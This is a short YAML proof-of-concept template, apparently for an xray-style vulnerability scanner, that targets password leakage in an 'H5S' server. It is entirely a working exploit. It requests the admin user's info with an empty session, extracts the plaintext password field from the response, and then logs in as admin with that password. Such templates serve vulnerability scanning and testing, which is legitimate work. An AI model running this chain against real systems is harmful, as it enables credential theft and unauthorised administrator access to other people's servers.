name: poc-yaml-h5s-accout-password-leakage
manual: true
transport: http
rules:
  - method: GET
    cache: true
    path: "/api/v1/GetUserInfo?user=admin&session="
    expression: |
      response.status == 200 && response.body.bcontains(b"strPasswd")
    search: >-
      "strPasswd": "(?P<name>.+?)"
  - method: POST
    cache: true
    path: /api/v1/Login?user=admin&password={{name}}
    expression: |
      response.status == 200 && response.body.bcontains(b"true")